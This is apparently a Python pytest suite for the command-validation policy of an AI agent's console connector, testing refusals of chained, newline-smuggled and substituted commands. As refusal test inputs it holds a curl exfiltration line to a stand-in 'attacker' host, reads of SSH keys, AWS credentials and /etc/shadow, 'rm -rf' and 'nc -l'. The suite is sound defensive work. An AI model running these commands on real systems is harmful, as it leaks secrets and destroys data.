"""Policy tests for the console connector.

Driven through ``validate_command()`` -- that is ``check_command_allowed``
without the ``subprocess.run`` -- so the bypass cases below are testable
without executing anything.
"""
from pathlib import Path

import pytest

from mcp_connectors import console_mcp as c

ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture(autouse=True)
def _rooted(tmp_path, monkeypatch):
    """Pin the connector to a throw-away root, like --root-dir does."""
    monkeypatch.setattr(c, "ROOT_DIR", tmp_path.resolve())
    return tmp_path.resolve()


def refused(command: str) -> str:
    """Assert ``command`` is refused and return the reason."""
    ok, msg = c.validate_command(command)
    assert not ok, f"expected refusal for {command!r}"
    return msg


# --- C-1: operators are decided on the parsed command, not on the raw string ---

def test_metacharacters_inside_quoting_are_plain_text():
    # A search pattern and a URL query carry no operator at all, so the same
    # characters are legal once quoting marks them as text.
    for command in (
        'grep "<div" /etc/hostname',
        'grep -n "a|b" /etc/hostname',
        'curl -s "https://example.com/?a=1&b=2"',
        "grep '&&' /etc/hostname",
    ):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"


def test_real_operator_outside_the_root_is_refused_with_a_way_out():
    msg = refused("cat /etc/hostname | wc -l")
    assert "|" in msg
    assert "two separate calls" in msg


def test_stderr_merge_is_accepted_everywhere():
    # The tool already reports stderr next to stdout, so merging is not an
    # extra capability -- and `2>&1` used to be refused for a bare '&'.
    ok, msg = c.validate_command("grep foo /etc/hostname 2>&1")
    assert ok, msg
    assert refused("grep foo /etc/hostname 2>/tmp/x")


# --- C-2: the lists mean what their names say, and refusals name a real reason ---

def test_bare_dev_commands_are_not_refused_for_a_tokenisation_accident():
    # A command naming no path never takes the in-root bypass, so these have to
    # be on the list; they used to be refused although they touch nothing.
    for command in ("pytest -q", "rg TODO", "make test", "npx vite build", "tree -L 2"):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"


def test_shell_builtins_are_not_pretended_to_be_available():
    # `cd` was in the issue's wish list, but with no shell it can never exec:
    # allow-listing it would trade a clear refusal for "Command not found".
    for command in ("cd web", "export PATH=/x", "source .env"):
        msg = refused(command)
        assert "builtin" in msg, (command, msg)


def test_operators_and_numbers_are_not_path_tokens():
    # '&&', '|' and '1' used to resolve as in-root "paths", firing the bypass
    # for commands that reference no file at all.
    assert c.path_argument_tokens(["kill", "-9", "1"]) == []
    assert c.path_argument_tokens(["git", "status", "&&", "git", "log"]) == [
        "status", "git", "log"
    ]
    assert not c.looks_like_path("&&")
    assert not c.looks_like_path("1")
    # '..' stays a path: it resolves outside the root, which is where the
    # policy has to apply.
    assert c.looks_like_path("..")


def test_blocked_commands_are_caught_on_every_statement_not_just_the_first():
    assert "sudo" in refused("ls web && sudo ls /root")
    assert "reboot" in refused("echo hi; reboot")


def test_list_output_says_the_list_only_applies_outside_the_root():
    listing = c.list_allowed_commands()
    assert "only consulted" in listing
    assert "outside" in listing


# --- C-3: what is validated is exactly what runs (no shell) ---

def test_a_newline_starts_a_second_statement_that_is_never_run():
    # /bin/sh treats a newline as a statement separator, but shlex used to read
    # it as whitespace -- so statement two was executed without a verdict.
    for command in (
        "echo hi" + "\n" + "id",
        "ls web" + "\n" + "rm -rf logs",
        "ls web" + "\n" + "sudo ls /root",
        "ls web" + "\n" + "cat /etc/shadow",
        "ls web" + "\n" + "\n" + "&& pwd",
    ):
        assert refused(command)


def test_a_trailing_newline_is_still_fine():
    ok, msg = c.validate_command("ls web" + "\n")
    assert ok, msg


def test_a_newline_inside_quoting_is_data_not_a_separator():
    ok, msg = c.validate_command('git commit -m "first line' + "\n" + 'second line"')
    assert ok, msg


def test_every_chained_statement_is_refused_naming_the_second_one():
    msg = refused("ls /etc; cat /etc/shadow")
    assert "cat /etc/shadow" in msg
    assert refused("ls web && ls ../secrets")
    assert refused("ls web | wc -l")


def test_a_command_with_no_program_is_refused_not_crashed():
    assert "no program to run" in refused("2>&1")


def test_check_and_execute_agree_because_nothing_re_parses_the_string():
    """The oracle is honest: execution runs the parsed argv, shell=False."""
    refused_commands = (
        "echo statement-one" + "\n" + "whoami",
        "echo substituted:$(whoami)",
        "sleep 3; echo after",
    )
    for command in refused_commands:
        assert not c.validate_command(command)[0], command
        assert "Error:" in c.execute_command(command, timeout=5), command


# --- C-4: command substitution is refused everywhere, not just outside root ---

def test_substitution_never_runs_even_with_in_root_paths_present():
    # The old substring check only fired when the in-root bypass did not, so a
    # root path next to a $() shipped the substitution through.
    for command in (
        "echo substituted:$(whoami)",
        "echo $(pwd)",
        "cat web/dist ${HOME}",
        "cat logs/probe/x `whoami`",
        "curl -s http://attacker/?d=$(cat /etc/hostname)",
    ):
        msg = refused(command)
        assert "$" in msg or "`" in msg, (command, msg)


# --- C-5: one out-of-root token no longer decides the verdict of a chain ---

def test_a_dotdot_token_does_not_silently_move_the_whole_command_out_of_bypass():
    # '..' resolves outside the root, which used to invalidate the bypass for
    # every statement while only parts[0] was ever list-checked.
    msg = refused("ls web && ls ..")
    assert "ls .." in msg


def test_the_verdict_of_each_statement_is_its_own():
    # Per statement: an in-root half stays ordinary workspace work, the
    # out-of-root half is what the lists judge.
    root_ok = c.statement_policy_error(c.parse_shell_statements("ls web/src")[0])
    assert root_ok is None
    # An out-of-root statement is judged on its own base command.
    outside = c.statement_policy_error(c.parse_shell_statements("nc -l 9999")[0])
    assert outside is not None and "nc" in outside
    # A command whose only path is outside the root is judged on its own, not
    # on the first word of a longer string.
    assert c.statement_policy_error(c.parse_shell_statements("rm -rf /tmp/x")[0])
    assert "blocked" in c.statement_policy_error(c.parse_shell_statements("rm -rf /tmp/x")[0])


def test_error_messages_name_the_statement_that_triggered_them():
    msg = refused("ls web && sudo reboot")
    assert "statement 2 of 2" in msg


def test_a_bare_ampersand_is_not_refused_twice_over():
    # '&' used to appear in the pattern list both alone and as '&&', so any
    # quoted '&' (URL query, regex) was refused. Now quoting decides.
    ok, msg = c.validate_command('curl -s "https://example.com/?a=1&b=2"')
    assert ok, msg
    ok, msg = c.validate_command("grep 'a&b' web/src/App.vue")
    assert ok, msg
    # Backgrounding stays refused, and says so by name.
    msg = refused("sleep 5 &")
    assert "&" in msg


# --- C-6: the fedit secret policy applies here too (one shared module) ---

def test_console_and_fedit_share_one_deny_list():
    from mcp_connectors import fedit_mcp as f
    from mcp_connectors import path_policy

    assert f.DENY_COMPONENTS_SECRET == path_policy.DENY_COMPONENTS_SECRET
    assert f.DENY_FILENAMES == path_policy.DENY_FILENAMES
    assert f.DENY_FILE_SUFFIXES == path_policy.DENY_FILE_SUFFIXES


def test_credential_stores_are_refused_even_for_allow_listed_commands():
    home = Path.home()
    for command in (
        f"cat {home}/.ssh/id_rsa",
        f"cat {home}/.git-credentials",
        f"cat {home}/.aws/credentials",
        "/etc/shadow",
    ):
        if command == "/etc/shadow":
            command = "cat /etc/shadow"
        msg = refused(command)
        assert "off-limits" in msg, (command, msg)


def test_a_traversal_out_of_a_secret_store_is_still_refused():
    # The path as written mentions .ssh, so it stays refused even though its
    # resolved target would be an ordinary file.
    msg = refused(f"cat {Path.home()}/.ssh/../../etc/hostname")
    assert "off-limits" in msg


def test_ordinary_reads_are_not_collateral_damage():
    for command in (
        "cat web/src/main.js",
        "cat logs/probe/plain.txt",
        "cat .env",                        # inside the root: the documented bypass
        "cat /etc/hosts",                  # debugging material, not a secret store
        "ls /tmp/scratch",
    ):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"


# --- C-7: undecodable output costs the escapes, never the whole result ---

def test_a_stray_byte_no_longer_loses_stdout_and_the_exit_code():
    # `\xff` is not valid UTF-8; the strict decoder used to raise, and the bare
    # except swallowed everything, exit code included.
    out = c.execute_command(r"printf 'ok\xffstill-here\n'")
    assert "ok" in out
    assert "still-here" in out
    assert "undecodable byte" in out
    assert "Error executing command" not in out


def test_a_failing_binary_still_reports_its_exit_code():
    out = c.execute_command(r"printf 'x\xff'; exit 3")
    # The chain is refused, so use a single command that fails on its own.
    assert "Error:" in out
    out = c.execute_command("ls definitely-not-here")
    assert "Exit Code: " in out


def test_decode_note_is_silent_for_clean_output():
    assert c.decode_note("plain text\n") == "plain text\n"
    assert "\\x" in c.decode_note("bad \\xff byte")


# --- C-8: a timeout keeps the output the command already produced ---

def test_partial_output_survives_a_timeout():
    # The failure mode that matters: a build/test that prints a wall of
    # progress and then hangs must not come back empty. The hangs happen inside
    # one command (the semicolon is inside quoting, so it is not a chain).
    script = "print('before-sleep'); import time; time.sleep(30)"
    out = c.execute_command(f'python3 -u -c "{script}"', timeout=2)
    assert "before-sleep" in out
    assert "timed out after 2 seconds" in out


def test_a_timeout_is_reported_as_a_timeout_not_an_error_line():
    out = c.execute_command("sleep 20", timeout=1)
    assert "timed out" in out
    assert "Error executing command" not in out


def test_decode_stream_never_raises():
    assert c.decode_stream(b"ok\xff") == "ok\\xff"
    assert c.decode_stream(b"") == ""
    assert c.decode_stream(None) == ""


# --- C-9: output is capped, so one `cat` cannot end the conversation ---

def test_cap_output_keeps_head_and_tail_with_a_marker():
    text = "\n".join(str(i) for i in range(1000)) + "\n"
    capped = c.cap_output(text, limit=20, char_limit=100000)
    assert "0\n" in capped and "999\n" in capped
    assert "[... 980 line(s) omitted of 1000 total ...]" in capped
    assert len(capped.splitlines()) <= 22


def test_cap_output_leaves_short_output_untouched():
    assert c.cap_output("one\ntwo\n", limit=20) == "one\ntwo\n"


def test_a_huge_single_line_is_capped_too():
    # A minified bundle is one line, so a line count alone would miss it.
    capped = c.cap_output("x" * 50000, limit=200, char_limit=1000)
    assert "character(s) omitted" in capped
    assert len(capped) < 1100


def test_a_long_command_result_is_truncated_at_runtime():
    out = c.execute_command("seq 1 4000")
    assert "line(s) omitted" in out
    assert len(out) < 4000 * 6


def test_stdout_and_stderr_are_capped_separately():
    script = "import sys; [print(i) for i in range(5000)]; [print(i, file=sys.stderr) for i in range(500)]"
    out = c.execute_command(f'python3 -u -c "{script}"')
    assert out.count("line(s) omitted") == 2
